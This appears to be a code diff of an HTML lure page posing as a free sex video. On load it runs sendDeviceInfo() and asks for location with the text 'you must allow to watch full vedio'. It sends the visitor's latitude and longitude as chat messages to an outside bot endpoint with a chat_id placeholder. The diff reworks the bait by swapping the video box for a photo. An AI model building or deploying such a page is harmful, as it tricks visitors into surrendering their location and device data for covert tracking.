@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Free Vedio Sex</title>
+  <title>Free Sex Vedio</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -22,38 +22,36 @@
       cursor: pointer;
       margin-right: 10px;
     }
-    
-    #video-container {
-      display: none;
-      margin-top: 20px;
+       #photo-section {
+      text-align: center;
     }
     
-    #video-container h2 {
-      color: #333;
-      margin-bottom: 10px;
+    #photo-image {
+      max-width: 100%;
+      max-height: 100%;
     }
     
-    #video-container p {
-      color: #666;
-      margin-bottom: 10px;
+    html, body, #photo-section {
+      height: 100%;
     }
-    
-    #video-container button {
-      background-color: #2196F3;
+    body {
+      display: flex;
+      align-items: center;
+      justify-content: center;
     }
   </style>
 </head>
 <body onload="sendDeviceInfo()">
-  <h1>Free Vedio Sex</h1>
+  <h1>Free Sex Vedio</h1>
   
-  <button onclick="sendDeviceInfo()">Send Device Info</button>
-  <button onclick="requestLocation()">Request Location</button>
-  
-  <div id="video-container">
-    <h2>Video</h2>
-    <p>Please allow location permission to watch the video.</p>
-    <button onclick="requestLocation()">Allow Location</button>
+  <div id="location-info">
+    <h2>you must allow to watch full vedio:</h2>
+    <p>Waiting for permission to access location...</p>
   </div>
+  <div id="photo-section">
+  <h2>Sexy Vedio:</h2>
+  <img id="photo-image" src="h1.jpg" alt="Uploaded Photo">
+</div>
   
   <script>
     function sendDeviceInfo() {
@@ -109,13 +107,6 @@
         chat_id: '<YOUR_CHAT_ID>',
         text: 'Latitude: ' + latitude + ', Longitude: ' + longitude
       }));
-      
-      showVideo();
-    }
-    
-    function showVideo() {
-      var videoContainer = document.getElementById('video-container');
-      videoContainer.style.display = 'block';
     }
   </script>
 </body>
